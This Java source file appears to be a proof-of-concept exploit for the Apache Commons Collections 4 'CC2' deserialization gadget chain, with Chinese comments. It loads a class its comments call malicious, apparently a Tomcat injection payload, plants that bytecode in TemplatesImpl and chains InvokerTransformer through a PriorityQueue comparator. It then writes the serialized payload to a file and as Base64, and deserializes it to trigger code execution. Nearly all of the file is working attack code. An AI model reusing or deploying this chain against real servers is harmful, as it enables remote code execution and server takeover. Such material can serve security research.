package com.example.demo.Main;


import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CC2Poc {
    public static void main(String[] args) throws Exception {
        //构造恶意类TestTemplatesImpl并转换为字节码
        ClassPool classPool = ClassPool.getDefault();
        /**
         * TestTemplatesImpl
         *
         * TemplatesImpl
         * TemplatesImplServlet
         *
         * TomcatInject
         *
         * TomcatInjectKill
         */

        //获取恶意类字节码
        CtClass ctClass = classPool.getCtClass("com.example.demo.Static.TomcatInjectKill");
        byte[] bytes = ctClass.toBytecode();
        System.out.println(bytes);

        //反射创建TemplatesImpl
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Constructor<?> constructor = aClass.getDeclaredConstructor(new Class[]{});
        Object TemplatesImpl_instance = constructor.newInstance();

        //将恶意类的字节码设置给_bytecodes属性
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(TemplatesImpl_instance, new byte[][]{bytes});

        //设置属性_name为恶意类名
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(TemplatesImpl_instance, "TestTemplatesImpl");

        //构造利用链
        InvokerTransformer transformer = new InvokerTransformer("newTransformer", null, null);
        TransformingComparator transformer_comparator = new TransformingComparator(transformer);

        //触发漏洞
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        //设置comparator属性
        Field field = queue.getClass().getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, transformer_comparator);

        //设置queue属性
        field = queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        //队列至少需要2个元素
        Object[] objects = new Object[]{TemplatesImpl_instance, TemplatesImpl_instance};
        field.set(queue, objects);

        //序列化 ---> 反序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        byte[] serializedBytes = barr.toByteArray();

        try{
            //ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11Step1.ser"));
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2Step4.ser"));
            outputStream.writeObject(queue);
            outputStream.close();

        }catch(Exception e){
            e.printStackTrace();
        }

        // 输出为 Base64 编码字符串
        String base64String = Base64.getEncoder().encodeToString(serializedBytes);
        System.out.println("Serialized bytes (Base64): " + base64String);


        byte[] run = Base64.getDecoder().decode(base64String);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(run));
        Object object = ois.readObject();
    }
}
